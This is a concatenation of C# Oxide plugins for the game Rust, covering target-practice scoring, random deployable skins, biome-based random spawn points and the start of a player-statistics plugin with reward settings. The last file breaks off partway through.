                if (mods.Contains("weapon.mod.small.scope"))
                    formattedWeapon = formattedWeapon + "Scoped ";
            }
            formattedWeapon = formattedWeapon + weaponstring;
            return formattedWeapon;
        }
        void OnEntitySpawned(BaseNetworkable entity)
        {
            if (entity != null)
                if (entity.GetComponent<ReactiveTarget>())            
                    ModifyTargetStats(entity);            
        }
        private void ModifyTargetStats(BaseNetworkable entity)
        {
            if (entity != null)
            {
                knockdownMaxValue.SetValue((ReactiveTarget)entity, maxKnockdown);
                entity.SendNetworkUpdateImmediate(false);
            }
        }
        private void OverwriteDuplicate(BasePlayer player)
        {
            if (!currentHits[player.userID].time)
            {
                currentHits[player.userID].time = true;
                timer.Once(0.05f, () => GetMessage(player));
            }
        }
        private void GetMessage(BasePlayer player)
        {
            string hit = currentHits[player.userID].msg;
            float distance = currentHits[player.userID].distance;
            TPUI.GetPlayer(player).UseUI(fontColor2 + hit + "</color> " + fontColor1 + distance + "M</color>");
            currentHits[player.userID].time = false;
        }
        private void CheckPlayerData(BasePlayer player)
        {
            var data = shotData.longShot;
            if (!data.ContainsKey(player.userID)) data.Add(player.userID, new TargetInfo() { Name = player.displayName, Range = 0, Bullseye = 0 });
        }
        #endregion

        #region functions
        protected void LoadTargets()
        {
            ReactiveTarget[] targets = GameObject.FindObjectsOfType<ReactiveTarget>();

            if (targets.Length > 0)
            {
                foreach (ReactiveTarget target in targets.ToList())
                    ModifyTargetStats(target);
            }
        }
        private float GetPlayerDistance(Vector3 targetPos, Vector3 attackerPos)
        {
            var distance = Vector3.Distance(targetPos, attackerPos);
            var rounded = Mathf.Round(distance * 100f) / 100f;
            return rounded;
        }
        private void BroadcastToAll(string name, string range, string weapon) => PrintToChat(fontColor1 + "Target Practice: " + name + " </color>" + fontColor2 + "just set a new high score of " + "</color>" + fontColor1 + range + "M</color> " + fontColor2 + "using a</color> " + fontColor1 + weapon + "</color>");
        class TPUI : MonoBehaviour
        {
            public List<int> slots = new List<int>();
            int i;

            private BasePlayer player;

            void Awake()
            {
                player = GetComponent<BasePlayer>();
                i = 0;
            }

            public static TPUI GetPlayer(BasePlayer player)
            {
                TPUI p = player.GetComponent<TPUI>();
                if (p == null) p = player.gameObject.AddComponent<TPUI>();
                return p;
            }

            private int FindSlot()
            {
                for (int i = 0; i < maxUIMsg; i++)
                    if (!slots.Contains(i)) return i;
                return -1;
            }
            public void UseUI(string msg)
            {
                i++;
                string uiNum = i.ToString();
                
                int slot = FindSlot();
                if (slot == -1) return;

                Vector2 offset = (new Vector2(0, dimension.y) + new Vector2(0, UIspacing)) * slot;

                Vector2 posMin = position + offset;
                Vector2 posMax = posMin + dimension;

                var elements = new CuiElementContainer();
                CuiElement textElement = new CuiElement
                {
                    Name = uiNum,
                    Parent = "Overlay",
                    FadeOut = 0.1f,
                    Components =
                    {
                        new CuiTextComponent
                        {
                            Text = msg,
                            FontSize = fontSize,
                            Align = TextAnchor.MiddleCenter,
                            FadeIn = 0.1f
                        },
                        new CuiOutlineComponent
                        {
                            Distance = "1.0 1.0",
                            Color = "0.0 0.0 0.0 1.0"
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = posMin.x + " " + posMin.y,
                            AnchorMax = posMax.x + " " + posMax.y
                        }
                    }
                };
                elements.Add(textElement);
                CuiHelper.AddUi(player, elements);
                slots.Add(slot);
                Interface.GetMod().CallHook("DestroyHitMsg", new object[] { player, uiNum, slot, msgDuration });
            }
        }
        private void DestroyNotification(BasePlayer player, string msgNum, int slot)
        {
            bool t = CuiHelper.DestroyUi(player, msgNum);
            if (!t) DestroyNotification(player, msgNum, slot);
            TPUI.GetPlayer(player).slots.Remove(slot);
        }
        private void DestroyHitMsg(BasePlayer player, string msgNum, int slot, float duration)
        {
            timer.Once(duration, () => DestroyNotification(player, msgNum, slot));
        }
        #endregion

        #region chat commands
        [ChatCommand("target")]
        void cmdTarget(BasePlayer player, string command, string[] args)
        {
            if (args == null || args.Length == 0)
            {
                SendReply(player, fontColor1 + lang.GetMessage("tp", this, player.UserIDString));
                SendReply(player, fontColor1 + lang.GetMessage("hit1", this, player.UserIDString) + fontColor2 + lang.GetMessage("hit2", this, player.UserIDString));
                SendReply(player, fontColor1 + lang.GetMessage("be1", this, player.UserIDString) + fontColor2 + lang.GetMessage("be2", this, player.UserIDString));
                SendReply(player, fontColor1 + lang.GetMessage("time1", this, player.UserIDString) + fontColor2 + lang.GetMessage("time2", this, player.UserIDString));
                SendReply(player, fontColor1 + lang.GetMessage("pb1", this, player.UserIDString) + fontColor2 + lang.GetMessage("pb2", this, player.UserIDString));
                if (isAuth(player))
                    SendReply(player, fontColor1 + lang.GetMessage("wipe1", this, player.UserIDString) + fontColor2 + lang.GetMessage("wipe2", this, player.UserIDString));
                return;
            }
            switch (args[0].ToLower())
            {
                case "top":
                    if (args.Length >= 2)
                    {
                        if (args[1].ToLower() == "hit")
                        {
                            int amount = 5;
                            if (args.Length >= 3) int.TryParse(args[2], out amount);

                            Dictionary<ulong, TargetInfo> top5 = shotData.longShot.OrderByDescending(pair => pair.Value.Range).Take(amount).ToDictionary(pair => pair.Key, pair => pair.Value);

                            if (top5.Count > 0)
                            {
                                SendReply(player, fontColor1 + lang.GetMessage("title", this, player.UserIDString) + "</color>" + fontColor2 + lang.GetMessage("bestHits", this, player.UserIDString) + "</color>");
                                foreach (var name in top5)
                                    SendReply(player, string.Format(fontColor2 + lang.GetMessage("topList1", this, player.UserIDString) + "</color>", name.Value.Name, name.Value.Range, name.Value.Weapon));
                            }
                            return;
                        }
                        else if (args[1].ToLower() == "bullseye")
                        {
                            int amount = 5;
                            if (args.Length >= 4) int.TryParse(args[3], out amount);


                            Dictionary<ulong, TargetInfo> top5 = shotData.longShot.OrderByDescending(pair => pair.Value.Bullseye).Take(amount).ToDictionary(pair => pair.Key, pair => pair.Value);
                            if (top5.Count > 0)
                            {
                                SendReply(player, fontColor1 + lang.GetMessage("title", this, player.UserIDString) + "</color>" + fontColor2 + lang.GetMessage("bestBullseye", this, player.UserIDString) + "</color>");
                                foreach (var name in top5)
                                    SendReply(player, string.Format(fontColor2 + lang.GetMessage("topList1", this, player.UserIDString) + "</color>", name.Value.Name, name.Value.Bullseye, name.Value.Weapon));
                            }
                            return;
                        }
                    }
                    return;
                case "wipe":
                    if (isAuth(player))
                    {
                        shotData.longShot.Clear();
                        SendReply(player, lang.GetMessage("wipe", this, player.UserIDString));
                    }
                    return;
                case "time":
                    if (args.Length >= 2)
                    {
                        CheckPlayerData(player);
                        int time = popupTime;
                        int.TryParse(args[1], out time);
                        if (time != popupTime)
                            shotData.longShot[player.userID].PopupTime = time;
                        SendReply(player, string.Format(fontColor1 + lang.GetMessage("title", this, player.UserIDString) + "</color>" + fontColor2 + lang.GetMessage("changeTime", this, player.UserIDString) + "</color>", time));
                    }
                    return;
                case "pb":
                    if (shotData.longShot.ContainsKey(player.userID))
                    {
                        SendReply(player, fontColor1 + lang.GetMessage("title", this, player.UserIDString) + "</color>" + fontColor2 + lang.GetMessage("pb3", this, player.UserIDString));
                        SendReply(player, fontColor2 + lang.GetMessage("hit", this, player.UserIDString) + "</color> " + fontColor1 + shotData.longShot[player.userID].Range + lang.GetMessage("m", this, player.UserIDString));
                        SendReply(player, fontColor2 + lang.GetMessage("bullseye", this, player.UserIDString) + "</color> " + fontColor1 + shotData.longShot[player.userID].Bullseye + lang.GetMessage("m", this, player.UserIDString));
                    }
                    return;
            }
        }
        bool isAuth(BasePlayer player)
        {
            if (player.net.connection != null)            
                if (player.net.connection.authLevel < 1)
                    return false; 
            return true;
        }
        #endregion

        #region data
        class TargetData
        {
            public Dictionary<ulong, TargetInfo> longShot = new Dictionary<ulong, TargetInfo>();
            public BestHit bestHit = new BestHit();
            public TargetData() { }
        }
        class BestHit
        {
            public string Name = "";
            public float Range = 0;
            public string Weapon = "";
            public bool isBullseye = false;
        }
        class TargetInfo
        {
            public string Name;
            public float Range;
            public float Bullseye;
            public string Weapon;
            public bool UseUI = true;
            public int PopupTime = popupTime;           
        }
        class PlayerMSG
        {
            public string msg;
            public float distance;
            public string weapon;
            public bool time = false;
        }
        void SaveLoop()
        {
            SaveData();
            timer.Once(saveTimer * 60, () => SaveLoop());
        }
        void SaveData()
        {
            ShotData.WriteObject(shotData);
        }
        void LoadData()
        {
            try
            {
                shotData = Interface.GetMod().DataFileSystem.ReadObject<TargetData>("targetpractice_scores");
            }
            catch
            {
                Puts("Couldn't load TargetPractice data, creating new datafile");
                shotData = new TargetData();
            }
        }
        #endregion

        #region config
        //////////////////////////////////////////////////////////////////////////////////////
        // Configuration /////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////

        private bool changed;

        private static int popupTime = 5;
        private static int msgDuration = 5;
        private static int fontSize = 20;
        private static int saveTimer = 10;
        private static int maxUIMsg = 11;

        private static bool broadcastNewScore = true;
        private static bool disableFlamer = true;
        private static string fontColor1 = "<color=orange>";
        private static string fontColor2 = "<color=#939393>";

        private static float maxKnockdown = 100f;
        private static float UIspacing = 0.01f;

        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }
        private void LoadConfigVariables()
        {
            CheckCfg("Target - Default time to reset target (seconds)", ref popupTime);
            CheckCfg("Disable Flamethrower", ref disableFlamer);
            CheckCfg("Messages - Duration (seconds)", ref popupTime);
            CheckCfg("Messages - Font size", ref fontSize);
            CheckCfg("Messages - Message color", ref fontColor2);
            CheckCfg("Messages - Main color", ref fontColor1);
            CheckCfg("Messages - Broadcast new high scores to all", ref broadcastNewScore);
            CheckCfg("Data - Save timer (minutes)", ref saveTimer);
            CheckCfgFloat("Target - Knockdown health", ref maxKnockdown);
        }
        private void CheckCfg<T>(string Key, ref T var)
        {
            if (Config[Key] is T)
                var = (T)Config[Key];
            else
                Config[Key] = var;
        }
        private void CheckCfgFloat(string Key, ref float var)
        {

            if (Config[Key] != null)
                var = Convert.ToSingle(Config[Key]);
            else
                Config[Key] = var;
        }
        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                changed = true;
            }
            object value;
            if (!data.TryGetValue(datavalue, out value))
            {
                value = defaultValue;
                data[datavalue] = value;
                changed = true;
            }
            return value;
        }
        #endregion

        #region messages
        Dictionary<string, string> messages = new Dictionary<string, string>()
        {
            {"title", "TargetPractice: "},
            {"hit", "Hit" },
            {"bullseye", "Bullseye" },
            {"wipe", "You have wiped all TargetPractice hit data!" },
            {"bestBullseye", "--- Best Bullseye hits ---" },
            {"bestHits", "--- Best Hits ---" },
            {"topList1", "Name:</color><color=orange> {0}</color><color=#939393>, Distance:</color><color=orange> {1}</color><color=#939393>, Weapon:</color><color=orange> {2}" },
            {"changeTime", "You have changed the reset time to {0}" },
            {"tp", "Target Practice</color>" },
            {"hit1", "/target top hit <opt:##></color>" },
            {"hit2", " - Displays top 5 hit distances, optional number to change amount shown</color>" },
            {"be2", " - Displays top 5 bullseye hit distances, optional number to change amount shown</color>" },
            {"be1", "/target top bullseye <opt:##></color>" },
            {"time1", "/target time <##></color>" },
            {"time2", " - Change the target reset time</color>" },
            {"wipe1", "/target wipe</color>" },
            {"wipe2", " - Clear all hit data</color>" },
            {"pb1", "/target pb</color>" },
            {"pb2", " - Shows your best hits</color>" },
            {"pb3", "--- Personal Best ---</color>" },
            {"m", "M</color>" }
        };
        #endregion
    }
}


// --- End of file: TargetPractice.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RandomDeployables.cs ---
// --- Original Local Path: RandomDeployables.cs ---

// Reference: Rust.Workshop
using System;
using System.Collections.Generic;
using UnityEngine;
using System.Linq;
namespace Oxide.Plugins
{
    [Info("RandomDeployables", "Norn", 0.5, ResourceId = 2187)]
    [Description("Randomize deployable skins")]

    class RandomDeployables : RustPlugin
    {
        void Loaded()
        {
            permission.RegisterPermission("randomdeployables.able", this);
            InitializeTable();
            if (Config["Settings", "AllowDefaultSkin"] == null)
            {
                Puts("Updating configuration...");
                Config["Settings", "AllowDefaultSkin"] = false;
                SaveConfig();
            }
            Puts("[Enabled] Bags: " + Config["Enabled", "SleepingBags"].ToString() + " | Boxes: " + Config["Enabled", "Boxes"].ToString());
        }
        private static Dictionary<string, int> deployedToItem = new Dictionary<string, int>();
        private static List<ulong> SkinList = new List<ulong>();
        private void InitializeTable()
        {
            deployedToItem.Clear();
            SkinList.Clear();
            List<ItemDefinition> ItemsDefinition = ItemManager.GetItemDefinitions() as List<ItemDefinition>;
            foreach (ItemDefinition itemdef in ItemsDefinition)
            {
                if (itemdef.GetComponent<ItemModDeployable>() != null) deployedToItem.Add(itemdef.GetComponent<ItemModDeployable>().entityPrefab.resourcePath, itemdef.itemid);
                foreach(ItemSkinDirectory.Skin skin in itemdef.skins)
                {
                    var ws = Rust.Workshop.Approved.FindByInventoryId((ulong)skin.id);
                    if (skin.id != 0 && ws != null) { SkinList.Add(ws.WorkshopdId); } else { SkinList.Add((ulong)skin.id); }
                }
            }
            Puts(SkinList.Count.ToString() + " skins verified.");
        }
        protected override void LoadDefaultConfig()
        {
            // -- [ RESET ] ---

            Puts("No configuration file found, generating...");
            Config.Clear();

            // --- [ SETTINGS ] ---
            Config["Settings", "AllDeployables"] = false;
            Config["Settings", "UseAllSkins"] = false;
            Config["Settings", "AllowDefaultSkin"] = false;

            // --- [ CONFIG ] ---

            Config["Enabled", "SleepingBags"] = true;
            Config["Enabled", "Boxes"] = true;

            // --- [ PREFABS ] ---

            Config["PrefabID", "SleepingBag"] = "assets/prefabs/deployable/sleeping bag/sleepingbag_leather_deployed.prefab";
            Config["PrefabID", "LargeBox"] = "assets/prefabs/deployable/large wood storage/box.wooden.large.prefab";
        }
        private List<int> GetSkins(ItemDefinition def)
        {
            List<int> skins = new List<int> { 0 };
            skins.AddRange(ItemSkinDirectory.ForItem(def).Select(skin => skin.id));
            skins.AddRange(Rust.Workshop.Approved.All.Where(skin => skin.ItemName == def.shortname).Select(skin => (int)skin.WorkshopdId));
            if (!Convert.ToBoolean(Config["Settings", "AllowDefaultSkin"])) { if (skins.Contains(0)) { skins.Remove(0); } }
            return skins;
        }
        private void OnEntityBuilt(Planner planner, GameObject gameObject)
        {
            BaseEntity e = gameObject.ToBaseEntity();
            BasePlayer player = planner.GetOwnerPlayer();
            if (permission.UserHasPermission(player.net.connection.userid.ToString(), "randomdeployables.able"))
            {
                if (!(e is BaseEntity) || player == null) { return; }
                if (Convert.ToBoolean(Config["Settings", "AllDeployables"]))
                {
                    if (deployedToItem.ContainsKey(e.PrefabName))
                    {
                        var skin = 0;
                        var def = ItemManager.FindItemDefinition(deployedToItem[e.PrefabName]);
                        if (!Convert.ToBoolean(Config["Settings", "UseAllSkins"])) { skin = GetSkins(def).GetRandom(); }
                        else { skin = (int)SkinList.GetRandom(); }
                        e.skinID = Convert.ToUInt64(skin);
                        e.SendNetworkUpdate();
                    }
                }
                else
                {
                    if (gameObject.name == Config["PrefabID", "SleepingBag"].ToString() && Convert.ToBoolean(Config["Enabled", "SleepingBags"])) // Fire Up
                    {
                        var skin = 0;
                        var def = ItemManager.FindItemDefinition(deployedToItem[Config["PrefabID", "SleepingBag"].ToString()]);
                        if (!Convert.ToBoolean(Config["Settings", "UseAllSkins"])) { skin = GetSkins(def).GetRandom(); }
                        else { skin = (int)SkinList.GetRandom(); }
                        e.skinID = Convert.ToUInt64(skin);
                        e.SendNetworkUpdate();
                    }
                    else if (gameObject.name == Config["PrefabID", "LargeBox"].ToString() && Convert.ToBoolean(Config["Enabled", "Boxes"])) // Fire Up
                    {
                        var skin = 0;
                        var def = ItemManager.FindItemDefinition(deployedToItem[Config["PrefabID", "LargeBox"].ToString()]);
                        if (!Convert.ToBoolean(Config["Settings", "UseAllSkins"])) { skin = GetSkins(def).GetRandom(); }
                        else { skin = (int)SkinList.GetRandom(); }
                        e.skinID = Convert.ToUInt64(skin);
                        e.SendNetworkUpdate();
                    }
                }
            }
        }
    }
}

// --- End of file: RandomDeployables.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RandomSpawns.cs ---
// --- Original Local Path: RandomSpawns.cs ---

using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using UnityEngine;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("RandomSpawns", "ReCoDeX", "0.0.2", ResourceId = 0)]
    class RandomSpawns : RustPlugin
    {
        #region Fields
        private bool isDisabled;
        private int spawnCount;
        private Hash<BiomeType, List<Vector3>> spawnPoints = new Hash<BiomeType, List<Vector3>>();

        private int minPlayerReq = 1;
        System.Random random = new System.Random();
        #endregion

        #region Oxide Hooks
        [ChatCommand("showspawns")]
        private void cmdShowSpawns(BasePlayer player, string command, string[] args)
        {
            if (!player.IsAdmin) return;
            SendReply(player, "Total spawn count: " + spawnCount);
            foreach (var list in spawnPoints.Values)
            {
                foreach (var position in list)
                    player.SendConsoleCommand("ddraw.box", 30f, Color.magenta, position, 1f);
            }
        }

        private void OnServerInitialized()
        {
            isDisabled = true;
            LoadVariables();
            CalculateMinimumPlayers();
            GenerateSpawnpoints();
        }
        private object OnPlayerRespawn(BasePlayer player)
        {
            if (isDisabled || BasePlayer.activePlayerList.Count < minPlayerReq)
                return null;

            var targetpos = GetSpawnPoint(false);
            if (targetpos == null)
                return null;

            BasePlayer.SpawnPoint spawnPoint1 = new BasePlayer.SpawnPoint();
            spawnPoint1.pos = (Vector3)targetpos;
            spawnPoint1.rot = new Quaternion(0f, 0f, 0f, 1f);
            return spawnPoint1;
        }
        private BiomeType GetMajorityBiome(Vector3 position)
        {
            Dictionary<BiomeType, float> biomes = new Dictionary<BiomeType, float>
            {
                {BiomeType.Arctic, TerrainMeta.BiomeMap.GetBiome(position, TerrainBiome.ARCTIC) },
                {BiomeType.Arid, TerrainMeta.BiomeMap.GetBiome(position, TerrainBiome.ARID) },
                {BiomeType.Temperate, TerrainMeta.BiomeMap.GetBiome(position, TerrainBiome.TEMPERATE) },
                {BiomeType.Tundra, TerrainMeta.BiomeMap.GetBiome(position, TerrainBiome.TUNDRA) }
            };
            return biomes.OrderByDescending(x => x.Value).ToArray()[0].Key;
        }
        #endregion

        #region Functions
        private void CalculateMinimumPlayers()
        {
            minPlayerReq = 1000;

            foreach(var biome in configData.SpawnAreas)
            {
                if (biome.Value.Players < minPlayerReq)
                    minPlayerReq = biome.Value.Players;
            }
        }

        private object GetSpawnPoint(bool ignorePlayerRestriction = true)
        {
            BiomeType biomeType = spawnPoints.ElementAt(UnityEngine.Random.Range(0, spawnPoints.Count - 1)).Key;

            if (!ignorePlayerRestriction)
            {
                List<BiomeType> availableTypes = new List<BiomeType>();
                int onlinePlayers = BasePlayer.activePlayerList.Count;

                foreach(var biome in configData.SpawnAreas)
                {
                    if (biome.Value.Enabled && onlinePlayers >= biome.Value.Players)
                        availableTypes.Add(biome.Key);
                }

                biomeType = availableTypes.GetRandom();
                availableTypes.Clear();
            }

            Vector3 targetPos = spawnPoints[biomeType].GetRandom();
            if (targetPos == Vector3.zero)
                return null;

            List<BaseEntity> entities = Facepunch.Pool.GetList<BaseEntity>();
            Vis.Entities(targetPos, 15f, entities, LayerMask.GetMask("Construction", "Deployable"));
            int count = entities.Count;
            Facepunch.Pool.FreeList(ref entities);
            if (count > 0)
            {
                spawnPoints[biomeType].Remove(targetPos);
                -- spawnCount;
                if (spawnCount < 10)
                {
                    PrintWarning("All current spawnpoints have been overrun by buildings and such. Disabling random spawnpoints");
                    isDisabled = true;
                    return null;
                }
                return GetSpawnPoint(false);
            }
            return targetPos;
        }

        private void GenerateSpawnpoints()
        {
            PrintWarning("Generating spawnpoints. This may take a moment");
            for (int i = 0; i < 1500; i++)
            {
                float max = TerrainMeta.Size.x / 2;
                var success = FindNewPosition(new Vector3(0,0,0), max);
                if (success is Vector3)
                {
                    Vector3 spawnPoint = (Vector3)success;
                    float height = TerrainMeta.HeightMap.GetHeight(spawnPoint);
                    if (spawnPoint.y >= height && !(spawnPoint.y - height > 1))
                    {
                        BiomeType biome = GetMajorityBiome(spawnPoint);
                        if (configData.SpawnAreas[biome].Enabled)
                        {
                            if (!spawnPoints.ContainsKey(biome))
                                spawnPoints.Add(biome, new List<Vector3>());
                            spawnPoints[biome].Add(spawnPoint);
                        }
                    }
                }
            }
            foreach (var biome in spawnPoints)
                spawnCount += biome.Value.Count;

            PrintWarning($"{spawnCount} spawn points generated!");
            isDisabled = false;
        }

        private Vector3 CalculatePoint(Vector3 position, float max)
        {
            var angle = Math.PI * 2.0f * random.NextDouble();
            var radius = Math.Sqrt(random.NextDouble()) * max;
            var x = position.x + radius * Math.Cos(angle);
            var y = position.y + radius * Math.Sin(angle);
            return new Vector3((float)x, 300, (float)y);
        }

        private object FindNewPosition(Vector3 position, float max, bool failed = false)
        {
            var targetPos = UnityEngine.Random.insideUnitCircle * max;
            var sourcePos = new Vector3(position.x + targetPos.x, 300, position.z + targetPos.y);
            var hitInfo = RayPosition(sourcePos);
            var success = ProcessRay(hitInfo);
            if (success == null)
            {
                if (failed) return null;
                else return FindNewPosition(position, max, true);
            }
            else if (success is Vector3)
            {
                if (failed) return null;
                else return FindNewPosition(new Vector3(sourcePos.x, ((Vector3)success).y, sourcePos.y), max, true);
            }
            else
            {
                sourcePos.y = Mathf.Max((float)success, TerrainMeta.HeightMap.GetHeight(sourcePos));
                return sourcePos;
            }
        }

        private object ProcessRay(RaycastHit hitInfo)
        {
            if (hitInfo.collider != null)
            {
                if (hitInfo.collider?.gameObject.layer == LayerMask.NameToLayer("Water"))
                    return null;
                if (hitInfo.collider?.gameObject.layer == LayerMask.NameToLayer("Prevent Building"))
                    return null;
                if (hitInfo.GetEntity() != null)
                {
                    return hitInfo.point.y;
                }
                if (hitInfo.collider?.name == "areaTrigger")
                    return null;
                if (hitInfo.collider?.GetComponentInParent<SphereCollider>() || hitInfo.collider?.GetComponentInParent<BoxCollider>())
                {
                    return hitInfo.collider.transform.position + new Vector3(0, -1, 0);
                }
            }
            return hitInfo.point.y;
        }

        private RaycastHit RayPosition(Vector3 sourcePos)
        {
            RaycastHit hitInfo;
            Physics.Raycast(sourcePos, Vector3.down, out hitInfo);//, LayerMask.GetMask("Terrain", "World", "Construction"));

            return hitInfo;
        }
        #endregion

        #region Config
        enum BiomeType { Arid, Arctic, Temperate, Tundra }
        private ConfigData configData;
        class ConfigData
        {
            [JsonProperty(PropertyName = "Biome Options")]
            public Dictionary<BiomeType, BiomeOptions> SpawnAreas { get; set; }

            public class BiomeOptions
            {
                [JsonProperty(PropertyName = "Enable spawn points to be generated in this biome")]
                public bool Enabled { get; set; }
                [JsonProperty(PropertyName = "Minimum required online players before spawns from this biome will be selected")]
                public int Players { get; set; }
            }
        }
        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }
        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData
            {
                SpawnAreas = new Dictionary<BiomeType, ConfigData.BiomeOptions>
                {
                    [BiomeType.Temperate] = new ConfigData.BiomeOptions { Enabled = true, Players = 1 },
                    [BiomeType.Arid] = new ConfigData.BiomeOptions { Enabled = true, Players = 10 },
                    [BiomeType.Tundra] = new ConfigData.BiomeOptions { Enabled = true, Players = 20 },
                    [BiomeType.Arctic] = new ConfigData.BiomeOptions { Enabled = true, Players = 30 }
                }
            };
            SaveConfig(config);
        }
        private void LoadConfigVariables() => configData = Config.ReadObject<ConfigData>();
        void SaveConfig(ConfigData config) => Config.WriteObject(config, true);
        #endregion
    }
}


// --- End of file: RandomSpawns.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/PlayerStats.cs ---
// --- Original Local Path: PlayerStats.cs ---

﻿using UnityEngine;
using System;
using System.Globalization;
using System.Linq;
using Oxide.Game.Rust.Cui;
using System.Collections;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Core.Configuration;
using Newtonsoft.Json.Linq;

namespace Oxide.Plugins
{
    [Info("Player Stats", "HzHzHzHz", "0.1.4")]
    class PlayerStats : RustPlugin
    {

        #region Configuration
        bool init = false;
        bool autoGrantOnWipe = false;
        string cmdConfigStat = "stat";

        List<string> Kills = new List<string>();
        List<string> Gathers = new List<string>();
        List<string> Raiders = new List<string>();
        List<string> Onlines = new List<string>();
        List<string> Topformonths = new List<string>();

        private void LoadConfigValues()
        {
            bool changed = false;
            if (GetConfig("Основные настройки", "Включить автоматическую выдачу призов после вайпа?", ref autoGrantOnWipe))
            {
                Puts("Добавлен новый параметр в конфиг - Включить автоматическую выдачу призов после вайпа");
                changed = true;
            }
            if (GetConfig("Основные настройки", "Чатовая команда открытия статистики", ref cmdConfigStat))
            {
                Puts("Добавлен новый параметр в конфиг - Чатовая команда открытия статистики");
                changed = true;
            }

            var _Kills = new List<object>()
            {
                {"usergroup add {player} kills"},
                {"usergroup add {player} kills"}
            };
            var _Gathers = new List<object>()
            {
                {"usergroup add {player} gather"},
                {"usergroup add {player} gather"}
            };
            var _Raider = new List<object>()
            {
                {"usergroup add {player} raider"},
                {"usergroup add {player} raider"}
            };
            var _Onlines = new List<object>()
            {
                {"usergroup add {player} online"},
                {"usergroup add {player} online"}
            };
            var _topformonths = new List<object>()
            {
                {"usergroup add {player} topformonths"},
                {"usergroup add {player} topformonths"}

            };
            if (GetConfig("Награда игроков", "Награда игрока занявшего четыре раза подряд один и тот же ТОП", ref _topformonths))
            {
                PrintWarning("Добавлены новые параметры в конфиг - Награда игроков");
                changed = true;
            }
            Topformonths = _topformonths.Select(p => p.ToString()).ToList();

            if (GetConfig("Награда игроков", "Награда для ТОП-1 по онлайну", ref _Onlines))
                changed = true;
            Onlines = _Onlines.Select(p => p.ToString()).ToList();

            if (GetConfig("Награда игроков", "Награда для ТОП-1 в количестве использованых взрывных материалов (ТОП Рейдер)", ref _Raider))
            {
                PrintWarning("Добавлен новый список-параметр - Награда для ТОП-1 в количестве использованых взрывных материалов (ТОП Рейдер)");
                changed = true;
            }
            Raiders = _Raider.Select(p => p.ToString()).ToList();

            if (GetConfig("Награда игроков", "Награда для ТОП-1 в добыче ресурсов", ref _Gathers))
                changed = true;
            Gathers = _Gathers.Select(p => p.ToString()).ToList();

            if (GetConfig("Награда игроков", "Награда для ТОП-1 в убийствах", ref _Kills))
                changed = true;
            Kills = _Kills.Select(p => p.ToString()).ToList();

            if (changed)
                SaveConfig();
        }

        private bool GetConfig<T>(string MainMenu, string Key, ref T var)
        {
            if (Config[MainMenu, Key] != null)
            {
                var = (T)Convert.ChangeType(Config[MainMenu, Key], typeof(T));
                return false;
            }
            Config[MainMenu, Key] = var;
            return true;
        }
        #endregion
        
        float kills = 2;
        float deaths = 1;
        float resGather = 0.005f;
        float Raider = 0.25f;
        float level = 1;
        int topCount = 20;
        int timeInHours = 24 * 7;

        // общая структура данных
        readonly DynamicConfigFile dataFile = Interface.Oxide.DataFileSystem.GetFile("PlayerStats/PlayerStats");
        readonly DynamicConfigFile topFile = Interface.Oxide.DataFileSystem.GetFile("PlayerStats/PlayerTopList");
        readonly DynamicConfigFile timingFile = Interface.Oxide.DataFileSystem.GetFile("PlayerStats/PlayerTopTiming");
        readonly DynamicConfigFile lastWipeTopUsersDataFile = Interface.Oxide.DataFileSystem.GetFile("PlayerStats/LastWipeTopUsers");

        int time;

        Dictionary<ulong, PlayerData> data = new Dictionary<ulong, PlayerData>(); //человек-данные
        List<SkillTopUser> skillTopUsers;

        class PlayerData
        {
            public string name = "Неизвестно";
            public string avatar = "Неизвестно";
            public Gather gather;
            public Pvp pvp;
            public Raid raid;
            public int minutes = 0;
            public PlayerData() { }
        }

        class Gather
        {
            public int wood = 0;
            public int stone = 0;
            public int metalOre = 0;
            public int sulfurOre = 0;
            public int hqmetalOre = 0;
            public Gather() { }
        }

        class Pvp
        {
            public int kills = 0;
            public int deaths = 0;
            public Pvp() { }
        }
        class Raid
        {
            public int Explosive = 0;
            public int Beancan = 0;
            public int F1 = 0;
            public int Satchel = 0;
            public int TimedExpl = 0;
            public int RocketLaunched = 0;
            public int Rocket = 0;
            public int Incendiary = 0;
            public int High = 0;
            public Raid() { }
        }

        enum topSkill
        {
            kills,
            gather,
            online,
            raid,
            topformonth
        }

        class SkillTopUser
        {
            public topSkill skillType;
            public ulong userId;
            public int wipeCount;
            public bool giftTaken;

            public SkillTopUser(topSkill skillType, ulong userId, int wipeCount)
            {
                this.skillType = skillType;
                this.userId = userId;
                this.wipeCount = wipeCount;
            }
        }

        void CreatePlayerData(ulong id)
        {
            if (data.ContainsKey(id)) return;
            
            PlayerData i = new PlayerData();
            i.gather = new Gather();
            i.pvp = new Pvp();
            i.raid = new Raid();
            BasePlayer player = BasePlayer.FindByID(id) ?? BasePlayer.FindSleeping(id);
            if (player != null) i.name = player.displayName;
            data.Add(id, i);
        }

        private bool IsNPC(BasePlayer player)
        {
            if (player == null) return false;
            if (player is NPCPlayer)
                return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L))
                return true;
            return false;
        }

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            BasePlayer player = entity.ToPlayer();
            if (player == null || IsNPC(player)) return;
            ProcessItem(player, item);
        }

        void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            ProcessItem(player, item);
        }

        void ProcessItem(BasePlayer player, Item item)
        {
            if (!data.ContainsKey(player.userID))
            {
                CreatePlayerData(player.userID);
            }
            switch (item.info.shortname)
            {
                case "wood":
                    data[player.userID].gather.wood += item.amount;
                    break;
                case "stones":
                    data[player.userID].gather.stone += item.amount;
                    break;
                case "metal.ore":
                    data[player.userID].gather.metalOre += item.amount;
                    break;
